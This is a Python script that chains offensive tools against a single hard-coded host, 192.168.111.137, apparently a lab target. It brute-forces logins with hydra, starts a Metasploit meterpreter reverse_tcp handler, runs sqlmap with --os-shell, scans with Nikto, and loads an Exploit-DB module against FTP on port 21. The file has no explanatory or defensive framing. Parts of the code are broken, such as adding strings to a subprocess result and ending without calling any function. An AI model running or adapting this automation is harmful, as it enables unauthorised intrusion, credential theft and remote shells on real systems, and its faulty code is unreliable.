import subprocess
import os

# Function to get the most used port
def get_most_used_port():
    # This command uses the 'netstat' command to get the most used port
    result = subprocess.run(["netstat", "-n", "-a"], capture_output=True)
    output = result.stdout.decode()
    lines = output.split("\n")
    port_counts = {}
    for line in lines:
        if ":" in line:
            port = line.split(":")[-1].split("/")[0]
            if port in port_counts:
                port_counts[port] += 1
            else:
                port_counts[port] = 1
    most_used_port = max(port_counts, key=port_counts.get)
    return most_used_port

# Function to perform attack on a port using hydra
def attack_port_hydra(port):
    subprocess.run(["hydra", "-L", "users.txt", "-P", "passwords.txt", "192.168.111.137", str(port)])

# Function to perform attack on a port using metasploit
def attack_port_metasploit(port):
    subprocess.run(["msfconsole", "-x", f"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 192.168.111.137; set LPORT {port}; exploit; exit;"])

# Function to perform attack on a port using sqlmap
def attack_port_sqlmap(port):
    subprocess.run(["sqlmap", "-u", "http://192.168.111.137:80", "-p", str(port), "--os-shell"])

# Function to perform attack on a port using Nikto
def attack_port_nikto(port):
    subprocess.run(["nikto", "-h", f"http://192.168.111.137:{port}"])

# Function to exploit a vulnerability using Metasploit
def exploit_vulnerability(path):
    # Create directories
    subprocess.run(["mkdir", "-p", "/root/.msf4/modules/exploits/linux/remote"])

    pwd = subprocess.run(["pwd"])
    # Copy the exploit
    subprocess.run(["cp", pwd +"exploitdb/exploits"+ path, "/root/.msf4/modules/exploits/linux/remote"])

    # Run the updatedb command
    subprocess.run(["updatedb"])

    # Run the msfconsole command
    msfconsole = subprocess.Popen(["msfconsole"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Run the search command
    msfconsole.stdin.write(b"search 17491\n")
    msfconsole.stdin.flush()
    output = msfconsole.stdout.read().decode()
    print(output)

    # Run the use command
    msfconsole.stdin.write(b"use exploit/linux/remote/17491\n")
    msfconsole.stdin.flush()
    output = msfconsole.stdout.read().decode()
    print(output)

    # Run the set command
    msfconsole.stdin.write(b"set RHOSTS 192.168.111.137\n")
    msfconsole.stdin.flush()
    output = msfconsole.stdout.read().decode()
    print(output)

    msfconsole.stdin.write(b"set RPORT 21\n")
    msfconsole.stdin.flush()
    output = msfconsole.stdout.read().decode()
    print(output)

    # Run the exploit command
    msfconsole.stdin.write(b"exploit\n")
    msfconsole.stdin.flush()
    output = msfconsole.stdout.read().decode()
    print(output)

# Run the exploit_vulnerability function
